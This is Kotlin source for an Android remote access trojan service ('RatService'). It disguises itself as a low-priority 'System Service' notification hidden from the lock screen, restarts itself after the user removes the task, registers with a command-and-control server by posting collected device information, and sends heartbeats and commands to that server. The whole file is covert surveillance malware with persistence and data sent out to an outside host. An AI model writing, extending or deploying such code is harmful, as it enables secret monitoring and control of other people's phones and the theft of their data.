package com.minimal.rat.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.minimal.rat.R
import com.minimal.rat.util.DeviceUtils
import com.minimal.rat.util.NetworkUtils
import com.minimal.rat.util.PreferencesManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONObject
import java.net.URI
import java.util.concurrent.ConcurrentHashMap

class RatService : Service() {
    companion object {
        private const val TAG = "RatService"
        private const val NOTIFICATION_ID = 1337
        private const val CHANNEL_ID = "rat_service_channel"
        private var instance: RatService? = null
        fun getInstance(): RatService? = instance
    }

    private val httpClient = NetworkUtils.createHttpClient()
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private val pendingCommands = ConcurrentHashMap<String, String>()
    private val isConnected = java.util.concurrent.atomic.AtomicBoolean(false)
    private var reconnectAttempts = 0
    private val maxReconnectAttempts = 10
    private var c2Host = "10.0.2.2"
    private var c2Port = 8080
    private var c2Protocol = "http"
    private var c2WsUrl = "ws://10.0.2.2:8080/ws"

    override fun onCreate() {
        super.onCreate()
        instance = this
        initConfig()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification(), if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0)
        connectToC2()
        Log.d(TAG, "RAT Service started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        scope.cancel()
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartIntent = Intent(this, RatService::class.java).setPackage(packageName)
        val pendingIntent = PendingIntent.getService(this, 1, restartIntent, PendingIntent.FLAG_IMMUTABLE)
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun initConfig() {
        c2Host = PreferencesManager.getString("c2_host", "10.0.2.2")
        c2Port = PreferencesManager.getInt("c2_port", 8080)
        c2Protocol = PreferencesManager.getString("c2_protocol", "http")
        c2WsUrl = "${if (c2Protocol == "https") "wss" else "ws"}://$c2Host:$c2Port/ws"
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Background system service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, com.minimal.rat.MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
    }

    private fun connectToC2() {
        scope.launch {
            try {
                val client = okhttp3.OkHttpClient.Builder()
                    .build()
                val request = okhttp3.Request.Builder()
                    .url("$c2Protocol://$c2Host:$c2Port/api/register")
                    .post(NetworkUtils.createRequestBody(DeviceUtils.collectDeviceInfo(this@RatService).toString()))
                    .build()
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Registered with C2")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "C2 connection failed: ${e.message}")
                scheduleReconnect()
            }
        }
    }

    private fun scheduleReconnect() {
        if (reconnectAttempts < maxReconnectAttempts) {
            reconnectAttempts++
            val delay = minOf(1000L * (1 shl reconnectAttempts), 60000L)
            Handler(Looper.getMainLooper()).postDelayed({ connectToC2() }, delay)
        }
    }

    fun sendCommand(action: String, payload: String) {
        scope.launch {
            try {
                val cmd = JSONObject().apply {
                    put("id", java.util.UUID.randomUUID().toString())
                    put("action", action)
                    put("payload", payload)
                    put("timestamp", System.currentTimeMillis())
                }
                val request = okhttp3.Request.Builder()
                    .url("$c2Protocol://$c2Host:$c2Port/api/command")
                    .post(NetworkUtils.createRequestBody(cmd.toString()))
                    .build()
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) Log.w(TAG, "Command send failed: ${response.code}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Send command error: ${e.message}")
            }
        }
    }

    private fun sendHeartbeat() {
        scope.launch {
            try {
                val hb = JSONObject().apply {
                    put("action", "heartbeat")
                    put("payload", DeviceUtils.getBatteryInfo(this@RatService).toString())
                    put("timestamp", System.currentTimeMillis())
                }
                val request = okhttp3.Request.Builder()
                    .url("$c2Protocol://$c2Host:$c2Port/api/command")
                    .post(NetworkUtils.createRequestBody(hb.toString()))
                    .build()
                httpClient.newCall(request).execute()
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat failed: ${e.message}")
            }
        }
    }
}